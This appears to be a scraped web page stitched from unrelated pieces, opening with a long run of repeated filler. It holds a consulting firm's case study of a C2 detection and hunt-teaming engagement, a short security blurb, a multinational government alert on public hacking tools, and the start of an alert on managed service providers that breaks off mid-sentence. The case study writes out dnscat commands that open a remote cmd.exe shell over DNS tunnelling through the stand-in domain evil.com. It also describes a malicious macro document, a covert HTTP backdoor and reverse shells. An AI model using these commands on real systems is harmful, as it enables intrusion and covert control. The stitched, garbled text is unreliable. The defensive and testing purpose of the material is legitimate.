							  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections :  May be used in sections :  May be used in sections :  May be used in sections :  May be used in sections :  May be used in sections :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections :  May be used in sections :  May be used in sections :  May be used in sections :  May be used in sections  :  May be used in sections :  May be used in sections :  May be used in sections  :  May be used in sections :  May be used in sections :  May be used in sections :  May be used in sections :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections :  May be used in sections  :  May be used in sections :  May be used in sections  :  May be used in sections :  May be used in sections :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections :  May be used in sections :  May be used in sections :  May be used in sections :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :  May be used in sections  :
Decision Support ConsultingEvents FacultyAbout UsMy Account 
Insights Portal
We use cookies to deliver you the best experience on our website. 
                By continuing to use our website, you consent to our 
                cookie usage and revised Privacy Statement.A large financial institution realized that despite having performed numerous penetration tests and extensive log management reviews, their networks were not only vulnerable, but were often found to be already compromised. Worse, the malware and attacks discovered were in-place and operational without having been detected by any existing technology or processes.IANS, a leading decision-support and consulting firm in the information security industry, was called in to establish command and control (C2) channels with two testing machines. The purpose and objectives of this approach was to validate that there had, in fact, been prior C2 attacks; identify the nature and resolutions for these attacks, and through “Hunt Teaming,” emulate the prior attacks in order to better understand existing vulnerabilities and how to remediate for prevention.Refers to the influence an attacker has over a compromised computer system that they control. For example, a valid usage of the term is to say that attackers use “command and control infrastructure” to issue “command and control instructions” to their victims. Advanced analysis of command and control methodologies can be used to identify attackers, associate attacks, and disrupt ongoing malicious activity.Refers to the ability to detect C2 attacks. A number of tools such as IDS/IPS and log management are good at detecting known server-side attacks, but very few are successful in detecting client-side attacks, C2 or data exfiltration. The issue is that many organizations focus on keeping attackers out, but neglect honing their ability to react to an attacker that has successfully compromised their network.Often used in conjunction with C2 Detection, Hunt Teaming is a collection of techniques that are used to bypass traditional security technologies to hunt down other attackers who may have used similar techniques and have successfully “flown under the radar.”Initially, IANS tested Internet access behavior. The user account provided to IANS did not have the rights to access the Internet. IANS could access a few internal websites but was unable to directly contact any remote server. IANS noticed that there was a proxy in place on the network that the machine’s traffic was going through, so IANS disabled the local proxy settings in order to test if traffic would then bypass the proxy and be allowed. However, IANS could not access any remote websites, including Google.IANS attempted to see if nonstandard ports would be allowed out of the network by using a script that tried to establish connections with a remote server
on every port below 1024. A few of the ports tried were reported as open, meaning that a successful connection had been established. The client explained that the internal firewall would actually pretend to be the remote server and complete the connection between itself and the internal machine, but would then drop any further traffic that was sent. The firewall would not forward any traffic onto the remote server. IANS connected to these open ports manually to see if there would be a response returned from the server, but in each case the connection was closed unexpectedly. Also, The client quickly detected IANS’ attempts to make these outbound connections.IANS next performed a DNS lookup from the local machine using the built-in DNS lookup tool. The DNS lookup was performed for a website that was blocked through the proxy for IANS’ user. When the DNS query returned the real IP address of the remote host, IANS attempted to establish a C2 channel through a means known as DNS Tunneling and was successful using a tool called Dnscat. Dnscat allowed IANS to execute commands on the internal system from a remote server and also to transfer data between the two. In order for DNS tunneling to work, IANS set up a domain, “evil-dns.com”, that resolved to the IP address of IANS’s external server using a DNS A record. Another domain, “evil.com”, was set up so that it had a DNS NS record that resolved to the first domain, evil-dns.com. What this accomplished was that any DNS query for a sub-domain of evil.com, for example exploit.evil.com, would eventually be directed to the authoritative name server (NS) for evil.com which, as was already stated, was set to evil-dns.com. IANS set up Dnscat listening on port 53 of evil-dns.com since that is the default port for the DNS protocol and would be the\ port that received the query requests. The command used on evil-dns.com was:dnscat --listenThen on the internal machine, IANS executed the following command:dnscat --exec cmd.exe --domain evil.comThat command told Dnscat to connect using the domain “evil.com” and when a connection was established, to execute the program “cmd.exe”. This gave the remote Dnscat listener a command prompt that IANS could then use to execute commands on the internal machine. This technique worked due to the recursive nature of DNS queries. At no point were the internal machine and IANS’s external server communicating directly with each other; the firewall would have prevented that. Instead, the two machines were communicating through The client’s own internal DNS server, which would make queries on behalf of the internal machine and return the results of those queries as well. Dnscat places extra information in the queries and responses that get passed back and forth and thus is able to communicateThe client did not detect this C2 channel as the DNS traffic was not being monitored by their security appliances. However, The client was capturing and storing all DNS traffic and was able to find the specific traffic sent by Dnscat later. The client worked to come up with alerts that would at least notify them that such a channel was being exploited for communication. The client developed a rudimentary alert as a short term solution that would detect the specific version of Dnscat that IANS was using. However, The client was aware that the alert could be easily bypassed.Next, IANS set up a backdoor local administrator account scenario. From a Kali Linux machine, IANS compromised the victim machine by using the backdoor administrator account and Metasploit’s psexec_psh module. The Metasploit psexec_psh module communicates with the target over port 445 and installs a new service on the victim. The service, when started, runs a PowerShell command that injects shellcode into its own memory, resulting in a reverse connection back to the attacker. IANS was inside the Security Operations Center at the time this test was run, and almost immediately, The client staff noticed an alert and discovered the compromise of the victim machine. The alert was triggered due to the service created on the victim. In order to set up this scenario, an attacker would have to find a local administrator account password for a machine. Due to the clientside security on the laptops The client provided, IANS believes it would be unlikely for an up-to-date employee system to be compromised in this way. And if the scenario did happen, The client would stand a good chance of detecting it quickly.Since the PowerShell shellcode injection technique bypassed the local security controls, IANS created a Meterpreter session between the two internal machines by running a PowerShell command on the victim machine directly from a PowerShell command prompt. The command used a PowerShell script that provided shellcode and worked in a similar way to the psexec_psh Metasploit module but did not create a service. This technique must have some delivery mechanism to use instead of a service, such as a Microsoft Word document. In this case IANS manually executed the command on the victim machine.The screenshot shows the reverse connection being made, from the perspective of the Kali Linux machineThe following table details the attempts made by IANS to establish a C2 session using progressively more advanced types of malware and the results from the attempts. Along with descriptions, the Result column is color-coded based on the results.Green: The malware was stopped by client-side or network protections in place.Yellow: The malware bypassed the client-side and network protections and was able to establish a C2
channel between internal machines. After the channel was established, it was detected.Orange: The malware bypassed the client-side and network protections and was able to establish a C2 channel between internal machines undetected.Red: The malware bypassed all protections and was able to establish a C2 channel with an external server undetected.After the DNS tunneling technique using Dnscat was successful, IANS tested to see whether the attack could be delivered via an email attachment. IANS crafted a malicious Microsoft Word document that contained a macro programmed to deliver a Dnscat payload (a typical approach used by attackers). IANS tested the document on a local machine and confirmed that it worked. The user saw warnings about macros when they opened the document, but if they accepted the prompt, the macro would run and Dnscat would establish a connection.Finally, IANS created a custom backdoor just for egress testing of high-security environments (like the one existing at the client). This backdoor utilizes Base64 in a VIEWSTATE parameter over cleartext HTTP in order to bypass high security application inspection firewalls. In this test we were able to bypass all security controls and establish a backdoor session.Below is a screenshot of the malware beaconing every 30 seconds:Below is a screenshot of the Base64 encoded HTTP communication:Below is a screenshot of the decoded data of the backdoor pulling down a PowerSploit powershell direct memory injection attack:Also as part of this assessment IANS was tasked with identifying any systems compromised using advanced malware that bypasses traditional security technologies such as IDS/IPS and AV.We started by analyzing internal recursion cached DNS records. These records are created when an internal system communicates out to the Internet and resolves a domain name into an IP address. IANS takes these records and simply performs a check to see if there are any entries in the DNS cache that are known to be malicious systems. As part of a Hunt Teaming engagement, IANS pulls down multiple blacklists from sources like Dshield for comparative purposes. Simply running this comparison of existing DNS entries against known blacklists discovered 4 systems to be communicating with known botnet C2 servers.We notified the customer Incident Response (IR) team and they discovered these systems were compromised by advanced credit card scraping malware that bypassed their current AV and Firewall configuration. IANS then pulled all software publishers from systems in the target domain and discovered software on one system which had a random name and no publisher:Once again, this system was compromised.Next we looked at external router logs for a 48- hour period to identify any strange IP addresses and/or beaconing activity. First, we pulled out any connections to any of the top 500 websites via: http://www.alexa.com/topsitesNext, we pulled out all known advertising Domains: http://winhelp2002.mvps.org/hosts.txt Finally we started reviewing any network connections, which repeat within 5 min, 10 min and 30 min intervals over a 24-hour period. This revealed 3 different systems that were beaconing. The first system was a license server. The second was a system that had an unauthorized VPN tunnel back to a user’s home network; and the third was a system which had a previously unknown backdoor running and beaconing once every 25 min.Once this targeted malware was discovered, the customer went into full IR mode. We were requested to stop until the full impact of this malware was revealed.Through the Detection Point Assessment methodology, IANS was able to validate that prior C2 attacks occurred. This was accomplished by establishing command and control channels with two testing machines. IANS identified the nature of the attacks and emulated prior attacks through “Hunt Teaming” to understand the client’s existing vulnerabilities and offer insight on how to remediate and prevent future incidents. This approach enabled the client to uncover hidden vulnerabilities and stop existing malware/ attacks. Moreover, it educated the IT Security team on how to detect and handle future attacks of the same nature. The full impact of the malware was yet unknown at the time of this publication. Any future damage that it could have caused was eliminated via the Detection Point Assessment process.If you have a question, comment, or would like to learn more about our services, please use this form to let us know what you’re looking for. A member of the IANS team will be in touch soon.Social


                                LinkedIn



                                Twitter



                                RSS
LinksAbout UsContact UsCareers Privacy StatementDisclaimerIANS Research
                    Two Center Plaza, Suite 500
                    Boston, MA 02108
                    p: 617.399.8100
                    f: 617.399.8101

                    © Copyright 2018 IANS.
                    All rights reserved.
                
To dance the Security Tango, click the Let's Dance link up above.Two left feet? Don't worry - it's not as hard as you might think!
Originally, the Security Tango was mostly for Windows-based computers. I'm sure that those of you running Linux or a Macintosh used to laugh yourselves sick at all the machinations that your Windows-using friends had to go through to keep themselves safe. But don't get too complacent - your time is here! As Linux and the Mac have become more popular, we've see more viruses for them. Yes, there are verified malware programs out there for both the Macintosh and for Linux. You need to protect yourself. Equally importantly, if you don't at least run an antivirus program, you run the risk of passing a virus on to your Windows friends (assuming any of them actually talk to you). And that's just not being a good net citizen!

So I've split the Tango into parts - Windows, Linux, the Macintosh, etc. I'll add more as changes in technology warrant. But you get to all of them by that same "Let's Dance!" button in the menu!
This report is a collaborative research effort by the cyber security authorities of five nations: Australia, Canada, New Zealand, the United Kingdom, and the United States.[1][2][3][4][5]In it we highlight the use of five publicly available tools, which have been used for malicious purposes in recent cyber incidents around the world. The five tools are:To aid the work of network defenders and systems administrators, we also provide advice on limiting the effectiveness of these tools and detecting their use on a network.The individual tools we cover in this report are limited examples of the types of tools used by threat actors. You should not consider this an exhaustive list when planning your network defense.Tools and techniques for exploiting networks and the data they hold are by no means the preserve of nation states or criminals on the dark web. Today, malicious tools with a variety of functions are widely and freely available for use by everyone from skilled penetration testers, hostile state actors and organized criminals, to amateur cyber criminals.The tools in this Activity Alert have been used to compromise information across a wide range of critical sectors, including health, finance, government, and defense. Their widespread availability presents a challenge for network defense and threat-actor attribution.Experience from all our countries makes it clear that, while cyber threat actors continue to develop their capabilities, they still make use of established tools and techniques. Even the most sophisticated threat actor groups use common, publicly available tools to achieve their objectives.Whatever these objectives may be, initial compromises of victim systems are often established through exploitation of common security weaknesses. Abuse of unpatched software vulnerabilities or poorly configured systems are common ways for a threat actor to gain access. The tools detailed in this Activity Alert come into play once a compromise has been achieved, enabling attackers to further their objectives within the victim’s systems.The tools detailed in this Activity Alert fall into five categories: Remote Access Trojans (RATs), webshells, credential stealers, lateral movement frameworks, and command and control (C2) obfuscators.This Activity Alert provides an overview of the threat posed by each tool, along with insight into where and when it has been deployed by threat actors. Measures to aid detection and limit the effectiveness of each tool are also described.The Activity Alert concludes with general advice for improving network defense practices.First observed in May 2015, the JBiFrost RAT is a variant of the Adwind RAT, with roots stretching back to the Frutas RAT from 2012.A RAT is a program that, once installed on a victim’s machine, allows remote administrative control. In a malicious context, it can—among many other functions—be used to install backdoors and key loggers, take screen shots, and exfiltrate data.Malicious RATs can be difficult to detect because they are normally designed not to appear in lists of running programs and can mimic the behavior of legitimate applications.To prevent forensic analysis, RATs have been known to disable security measures (e.g., Task Manager) and network analysis tools (e.g., Wireshark) on the victim’s system.JBiFrost RAT is typically employed by cyber criminals and low-skilled threat actors, but its capabilities could easily be adapted for use by state-sponsored threat actors.Other RATs are widely used by Advanced Persistent Threat (APT) actor groups, such as Adwind RAT, against the aerospace and defense sector; or Quasar RAT, by APT10, against a broad range of sectors.Threat actors have repeatedly compromised servers in our countries with the purpose of delivering malicious RATs to victims, either to gain remote access for further exploitation, or to steal valuable information such as banking credentials, intellectual property, or PII.JBiFrost RAT is Java-based, cross-platform, and multifunctional. It poses a threat to several different operating systems, including Windows, Linux, MAC OS X, and Android.JBiFrost RAT allows threat actors to pivot and move laterally across a network or install additional malicious software. It is primarily delivered through emails as an attachment, usually an invoice notice, request for quotation, remittance notice, shipment notification, payment notice, or with a link to a file hosting service.Past infections have exfiltrated intellectual property, banking credentials, and personally identifiable information (PII). Machines infected with JBiFrost RAT can also be used in botnets to carry out distributed denial-of-service attacks.Since early 2018, we have observed an increase in JBiFrost RAT being used in targeted attacks against critical national infrastructure owners and their supply chain operators. There has also been an increase in the RAT’s hosting on infrastructure located in our countries.In early 2017, Adwind RAT was deployed via spoofed emails designed to look as if they originated from Society for Worldwide Interbank Financial Telecommunication, or SWIFT, network services.Many other publicly available RATs, including variations of Gh0st RAT, have also been observed in use against a range of victims worldwide.Some possible indications of a JBiFrost RAT infection can include, but are not limited to:Protection is best afforded by ensuring systems and installed applications are all fully patched and updated. The use of a modern antivirus program with automatic definition updates and regular system scans will also help ensure that most of the latest variants are stopped in their tracks. You should ensure that your organization is able to collect antivirus detections centrally across its estate and investigate RAT detections efficiently.Strict application whitelisting is recommended to prevent infections from occurring.The initial infection mechanism for RATs, including JBiFrost RAT, can be via phishing emails. You can help prevent JBiFrost RAT infections by stopping these phishing emails from reaching your users, helping users to identify and report phishing emails, and implementing security controls so that the malicious email does not compromise your device. The United Kingdom National Cyber Security Centre (UK NCSC) has published phishing guidance.China Chopper is a publicly available, well-documented webshell that has been in widespread use since 2012.Webshells are malicious scripts that are uploaded to a target host after an initial compromise and grant a threat actor remote administrative capability.Once this access is established, webshells can also be used to pivot to additional hosts within a network.China Chopper is extensively used by threat actors to remotely access compromised web servers, where it provides file and directory management, along with access to a virtual terminal on the compromised device.As China Chopper is just 4 KB in size and has an easily modifiable payload, detection and mitigation are difficult for network defenders.China Chopper has two main components: the China Chopper client-side, which is run by the attacker, and the China Chopper server, which is installed on the victim web server but is also attacker-controlled.The webshell client can issue terminal commands and manage files on the victim server. Its MD5 hash is publicly available (originally posted on hxxp://www.maicaidao.com).The MD5 hash of the web client is shown in table 1 below.Table 1: China Chopper webshell client MD5 hashThe webshell server is uploaded in plain text and can easily be changed by the attacker. This makes it harder to define a specific hash that can identify adversary activity. In summer 2018, threat actors were observed targeting public-facing web servers that were vulnerable to CVE-2017-3066. The activity was related to a vulnerability in the web application development platform Adobe ColdFusion, which enabled remote code execution.China Chopper was intended as the second-stage payload, delivered once servers had been compromised, allowing the threat actor remote access to the victim host. After successful exploitation of a vulnerability on the victim machine, the text-based China Chopper is placed on the victim web server. Once uploaded, the webshell server can be accessed by the threat actor at any time using the client application. Once successfully connected, the threat actor proceeds to manipulate files and data on the web server.China Chopper’s capabilities include uploading and downloading files to and from the victim using the file-retrieval tool wget to download files from the internet to the target; and editing, deleting, copying, renaming, and even changing the timestamp, of existing files.The most powerful defense against a webshell is to avoid the web server being compromised in the first place. Ensure that all the software running on public-facing web servers is up-to-date with security patches applied. Audit custom applications for common web vulnerabilities.[6]One attribute of China Chopper is that every action generates a hypertext transfer protocol (HTTP) POST. This can be noisy and is easily spotted if investigated by a network defender.While the China Chopper webshell server upload is plain text, commands issued by the client are Base64 encoded, although this is easily decodable.The adoption of Transport Layer Security (TLS) by web servers has resulted in web server traffic becoming encrypted, making detection of China Chopper activity using network-based tools more challenging.The most effective way to detect and mitigate China Chopper is on the host itself—specifically on public-facing web servers. There are simple ways to search for the presence of the web-shell using the command line on both Linux and Windows based operating systems.[7]To detect webshells more broadly, network defenders should focus on spotting either suspicious process execution on web servers (e.g., Hypertext Preprocessor [PHP] binaries spawning processes) and out-of-pattern outbound network connections from web servers. Typically, web servers make predictable connections to an internal network. Changes in those patterns may indicate the presence of a web shell. You can manage network permissions to prevent web-server processes from writing to directories where PHP can be executed, or from modifying existing files.We also recommend that you use web access logs as a source of monitoring, such as through traffic analytics. Unexpected pages or changes in traffic patterns can be early indicators.Developed in 2007, Mimikatz is mainly used by attackers to collect the credentials of other users, who are logged into a targeted Windows machine. It does this by accessing the credentials in memory within a Windows process called Local Security Authority Subsystem Service (LSASS).These credentials, either in plain text, or in hashed form, can be reused to give access to other machines on a network.Although it was not originally intended as a hacking tool, in recent years Mimikatz has been used by multiple actors for malicious purposes. Its use in compromises around the world has prompted organizations globally to re-evaluate their network defenses.Mimikatz is typically used by threat actors once access has been gained to a host and the threat actor wishes to move throughout the internal network. Its use can significantly undermine poorly configured network security.Mimikatz source code is publicly available, which means anyone can compile their own versions of the new tool and potentially develop new Mimikatz custom plug-ins and additional functionality.Our cyber authorities have observed widespread use of Mimikatz among threat actors, including organized crime and state-sponsored groups.Once a threat actor has gained local administrator privileges on a host, Mimikatz provides the ability to obtain the hashes and clear-text credentials of other users, enabling the threat actor to escalate privileges within a domain and perform many other post-exploitation and lateral movement tasks.For this reason, Mimikatz has been bundled into other penetration testing and exploitation suites, such as PowerShell Empire and Metasploit.Mimikatz is best known for its ability to retrieve clear text credentials and hashes from memory, but its full suite of capabilities is extensive.The tool can obtain Local Area Network Manager and NT LAN Manager hashes, certificates, and long-term keys on Windows XP (2003) through Windows 8.1 (2012r2). In addition, it can perform pass-the-hash or pass-the-ticket tasks and build Kerberos “golden tickets.”Many features of Mimikatz can be automated with scripts, such as PowerShell, allowing a threat actor to rapidly exploit and traverse a compromised network. Furthermore, when operating in memory through the freely available “Invoke-Mimikatz” PowerShell script, Mimikatz activity is very difficult to isolate and identify.Mimikatz has been used across multiple incidents by a broad range of threat actors for several years. In 2011, it was used by unknown threat actors to obtain administrator credentials from the Dutch certificate authority, DigiNotar. The rapid loss of trust in DigiNotar led to the company filing for bankruptcy within a month of this compromise.More recently, Mimikatz was used in conjunction with other malicious tools—in the NotPetya and BadRabbit ransomware attacks in 2017 to extract administrator credentials held on thousands of computers. These credentials were used to facilitate lateral movement and enabled the ransomware to propagate throughout networks, encrypting the hard drives of numerous systems where these credentials were valid.In addition, a Microsoft research team identified use of Mimikatz during a sophisticated cyberattack targeting several high-profile technology and financial organizations. In combination with several other tools and exploited vulnerabilities, Mimikatz was used to dump and likely reuse system hashes.Updating Windows will help reduce the information available to a threat actor from the Mimikatz tool, as Microsoft seeks to improve the protection offered in each new Windows version.To prevent Mimikatz credential retrieval, network defenders should disable the storage of clear text passwords in LSASS memory. This is default behavior for Windows 8.1/Server 2012 R2 and later, but can be specified on older systems which have the relevant security patches installed.[8] Windows 10 and Windows Server 2016 systems can be protected by using newer security features, such as Credential Guard.Credential Guard will be enabled by default if:You should verify that your physical and virtualized servers meet Microsoft’s minimum requirements for each release of Windows 10 and Windows Server.Password reuse across accounts, particularly administrator accounts, makes pass-the-hash attacks far simpler. You should set user policies within your organization that discourage password reuse, even across common level accounts on a network. The freely available Local Administrator Password Solution from Microsoft can allow easy management of local administrator passwords, preventing the need to set and store passwords manually.Network administrators should monitor and respond to unusual or unauthorized account creation or authentication to prevent Kerberos ticket exploitation, or network persistence and lateral movement. For Windows, tools such as Microsoft Advanced Threat Analytics and Azure Advanced Threat Protection can help with this.Network administrators should ensure that systems are patched and up-to-date. Numerous Mimikatz features are mitigated or significantly restricted by the latest system versions and updates. But no update is a perfect fix, as Mimikatz is continually evolving and new third-party modules are often developed.Most up-to-date antivirus tools will detect and isolate non-customized Mimikatz use and should therefore be used to detect these instances. But threat actors can sometimes circumvent antivirus systems by running Mimikatz in memory, or by slightly modifying the original code of the tool. Wherever Mimikatz is detected, you should perform a rigorous investigation, as it almost certainly indicates a threat actor is actively present in the network, rather than an automated process at work.Several of Mimikatz’s features rely on exploitation of administrator accounts. Therefore, you should ensure that administrator accounts are issued on an as-required basis only. Where administrative access is required, you should apply privileged access management principles.Since Mimikatz can only capture the accounts of those users logged into a compromised machine, privileged users (e.g., domain administrators) should avoid logging into machines with their privileged credentials. Detailed information on securing Active Directory is available from Microsoft.[9]Network defenders should audit the use of scripts, particularly PowerShell, and inspect logs to identify anomalies. This will aid in identifying Mimikatz or pass-the-hash abuse, as well as in providing some mitigation against attempts to bypass detection software.PowerShell Empire is an example of a post-exploitation or lateral movement tool. It is designed to allow an attacker (or penetration tester) to move around a network after gaining initial access. Other examples of these tools include Cobalt Strike and Metasploit. PowerShell Empire can also be used to generate malicious documents and executables for social engineering access to networks.The PowerShell Empire framework was designed as a legitimate penetration testing tool in 2015. PowerShell Empire acts as a framework for continued exploitation once a threat actor has gained access to a system.The tool provides a threat actor with the ability to escalate privileges, harvest credentials, exfiltrate information, and move laterally across a network. These capabilities make it a powerful exploitation tool. Because it is built on a common legitimate application (PowerShell) and can operate almost entirely in memory, PowerShell Empire can be difficult to detect on a network using traditional antivirus tools.PowerShell Empire has become increasingly popular among hostile state actors and organized criminals. In recent years we have seen it used in cyber incidents globally across a wide range of sectors.Initial exploitation methods vary between compromises, and threat actors can configure the PowerShell Empire uniquely for each scenario and target. This, in combination with the wide range of skill and intent within the PowerShell Empire user community, means that the ease of detection will vary. Nonetheless, having a greater understanding and awareness of this tool is a step forward in defending against its use by threat actors.PowerShell Empire enables a threat actor to carry out a range of actions on a victim’s machine and implements the ability to run PowerShell scripts without needing powershell.exe to be present on the system Its communications are encrypted and its architecture is flexible.PowerShell Empire uses "modules" to perform more specific malicious actions. These modules provide the threat actor with a customizable range of options to pursue their goals on the victim’s systems. These goals include escalation of privileges, credential harvesting, host enumeration, keylogging, and the ability to move laterally across a network.PowerShell Empire’s ease of use, flexible configuration, and ability to evade detection make it a popular choice for threat actors of varying abilities.During an incident in February 2018, a UK energy sector company was compromised by an unknown threat actor. This compromise was detected through PowerShell Empire beaconing activity using the tool’s default profile settings. Weak credentials on one of the victim’s administrator accounts are believed to have provided the threat actor with initial access to the network.In early 2018, an unknown threat actor used Winter Olympics-themed socially engineered emails and malicious attachments in a spear-phishing campaign targeting several South Korean organizations. This attack had an additional layer of sophistication, making use of Invoke-PSImage, a stenographic tool that will encode any PowerShell script into an image.In December 2017, APT19 targeted a multinational law firm with a phishing campaign. APT19 used obfuscated PowerShell macros embedded within Microsoft Word documents generated by PowerShell Empire.Our cybersecurity authorities are also aware of PowerShell Empire being used to target academia. In one reported instance, a threat actor attempted to use PowerShell Empire to gain persistence using a Windows Management Instrumentation event consumer. However, in this instance, the PowerShell Empire agent was unsuccessful in establishing network connections due to the HTTP connections being blocked by a local security appliance.Identifying malicious PowerShell activity can be difficult due to the prevalence of legitimate PowerShell activity on hosts and the increased use of PowerShell in maintaining a corporate environment.To identify potentially malicious scripts, PowerShell activity should be comprehensively logged. This should include script block logging and PowerShell transcripts.Older versions of PowerShell should be removed from environments to ensure that they cannot be used to circumvent additional logging and controls added in more recent versions of PowerShell. This page provides a good summary of PowerShell security practices.[10]The code integrity features in recent versions of Windows can be used to limit the functionality of PowerShell, preventing or hampering malicious PowerShell in the event of a successful intrusion.A combination of script code signing, application whitelisting, and constrained language mode will prevent or limit the effect of malicious PowerShell in the event of a successful intrusion. These controls will also impact legitimate PowerShell scripts and it is strongly advised that they be thoroughly tested before deployment.When organizations profile their PowerShell usage, they often find it is only used legitimately by a small number of technical staff. Establishing the extent of this legitimate activity will make it easier to monitor and investigate suspicious or unexpected PowerShell usage elsewhere on the network.Attackers will often want to disguise their location when compromising a target. To do this, they may use generic privacy tools (e.g., Tor) or more specific tools to obfuscate their location.HUC Packet Transmitter (HTran) is a proxy tool used to intercept and redirect Transmission Control Protocol (TCP) connections from the local host to a remote host. This makes it possible to obfuscate an attacker’s communications with victim networks. The tool has been freely available on the internet since at least 2009.HTran facilitates TCP connections between the victim and a hop point controlled by a threat actor. Malicious threat actors can use this technique to redirect their packets through multiple compromised hosts running HTran to gain greater access to hosts in a network.The use of HTran has been regularly observed in compromises of both government and industry targets.A broad range of threat actors have been observed using HTran and other connection proxy tools toHTran can run in several modes, each of which forwards traffic across a network by bridging two TCP sockets. They differ in terms of where the TCP sockets are initiated from, either locally or remotely. The three modes areHTran can inject itself into running processes and install a rootkit to hide network connections from the host operating system. Using these features also creates Windows registry entries to ensure that HTran maintains persistent access to the victim network.Recent investigations by our cybersecurity authorities have identified the use of HTran to maintain and obfuscate remote access to targeted environments.In one incident, the threat actor compromised externally-facing web servers running outdated and vulnerable web applications. This access enabled the upload of webshells, which were then used to deploy other tools, including HTran.HTran was installed into the ProgramData directory and other deployed tools were used to reconfigure the server to accept Remote Desktop Protocol (RDP) communications.The threat actor issued a command to start HTran as a client, initiating a connection to a server located on the internet over port 80, which forwards RDP traffic from the local interface.In this case, HTTP was chosen to blend in with other traffic that was expected to be seen originating from a web server to the internet. Other well-known ports used included:Attackers need access to a machine to install and run HTran, so network defenders should apply security patches and use good access control to prevent attackers from installing malicious applications.Network monitoring and firewalls can help prevent and detect unauthorized connections from tools such as HTran.In some of the samples analyzed, the rootkit component of HTran only hides connection details when the proxy mode is used. When client mode is used, defenders can view details about the TCP connections being made.HTran also includes a debugging condition that is useful for network defenders. In the event that a destination becomes unavailable, HTran generates an error message using the following format:This error message is relayed to the connecting client in the clear. Network defenders can monitor for this error message to potentially detect HTran instances active in their environments. There are several measures that will improve the overall cybersecurity of your organization and help protect it against the types of tools highlighted in this report. Network defenders are advised to seek further information using the links below.Further information: invest in preventing malware-based attacks across various scenarios. See UK NCSC Guidance: https://www.ncsc.gov.uk/guidance/mitigating-malware.NCCIC encourages recipients of this report to contribute any additional information that they may have related to this threat. For any questions related to this report, please contact NCCIC atNCCIC encourages you to report any suspicious activity, including cybersecurity incidents, possible malicious code, software vulnerabilities, and phishing-related scams. Reporting forms can be found on the NCCIC/US-CERT homepage at http://www.us-cert.gov/.NCCIC strives to make this report a valuable tool for our partners and welcomes feedback on how this publication could be improved. You can help by answering a few short questions about this report at the following URL: https://www.us-cert.gov/forms/feedback.This product is provided subject to this Notification and this Privacy & Use policy.Network SystemsThe National Cybersecurity and Communications Integration Center (NCCIC) is aware of ongoing APT actor activity attempting to infiltrate the networks of global managed service providers (MSPs). Since May 2016, APT actors have used various tactics, techniques, and procedures (TTPs) for the purposes of cyber espionage and intellectual property theft. APT actors have targeted victims in several U.S. critical infrastructure sectors, including Information Technology (IT), Energy, Healthcare and Public Health, Communications, and Critical Manufacturing.This Technical Alert (TA) provides information and guidance to assist MSP customer network and system administrators with the detection of malicious activity on their networks and systems and the mitigation of associated risks. This TA includes an overview of TTPs used by APT actors in MSP network environments, recommended mitigation techniques, and information on reporting incidents.MSPs provide remote management of customer IT and end-user systems. The number of organizations using MSPs has grown significantly over recent years because MSPs allow their customers to scale and support their network environments at a lower cost than financing these resources internally. MSPs generally have direct and unfettered access to their customers’ networks, and may store customer data on their own internal infrastructure. By servicing a large number of customers, MSPs can achieve significant economies of scale. However, a compromise in one part of an MSP’s network can spread globally, affecting other customers and introducing risk.Using an MSP significantly increases an organization’s virtual enterprise infrastructure footprint and its number of privileged accounts, creating a larger attack surface for cyber criminals and nation-state actors. By using compromised legitimate MSP credentials (e.g., administration, domain, user), APT actors can move bidirectionally between an MSP and its customers’ shared networks. Bidirectional movement between networks allows APT actors to easily obfuscate detection measures and maintain a presence on victims’ networks.Note: NCCIC previously released information related to this activity in Alert TA17-117A: Intrusions Affecting Multiple Victims Across Multiple Sectors published on April 27, 2017, which includes indicators of compromise, signatures, suggested detection methods, and recommended mitigation techniques.APT actors use a range of “living off the land” techniques to maintain anonymity while conducting their attacks. These techniques include using legitimate credentials and trusted off-the-shelf applications and pre-installed system tools present in MSP customer networks.Pre-installed system tools, such as command line scripts, are very common and used by system administrators for legitimate processes. Command line scripts are used to discover accounts and remote systems.PowerSploit is a repository of Microsoft PowerShell and Visual Basic scripts and uses system commands such as netsh. PowerSploit, originally developed as a legitimate penetration testing tool, is widely misused by APT actors. These scripts often cannot be 